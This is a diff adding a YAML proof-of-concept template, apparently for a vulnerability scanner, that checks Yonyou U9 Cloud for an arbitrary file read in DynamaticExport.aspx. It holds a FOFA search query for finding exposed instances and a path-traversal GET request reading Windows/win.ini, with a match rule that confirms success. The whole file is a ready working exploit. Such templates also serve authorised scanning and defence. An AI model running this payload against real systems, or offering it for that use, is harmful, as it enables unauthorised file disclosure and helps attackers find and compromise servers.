@@ -1,0 +1,15 @@
+id: poc-yaml-yongyou-u9-dynamaticexport-aspx-anyfile-read
+info:
+  name: 用友U9 Cloud DynamaticExport.aspx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 用友U9
+  fofa: body="logo-u9.png" || body="/U9/css/"
+requests:
+- method: GET
+  path: /print/DynamaticExport.aspx?filePath=../../../../../../../../../../../../Windows/win.ini
+  expression: status_code == 200 && contains(body,"[files]") && contains(body,"[fonts]")
+    && contains(headers,"filename=win.ini") && contains(content_type,"application/octet-stream")
+variables: {}
+transport: http
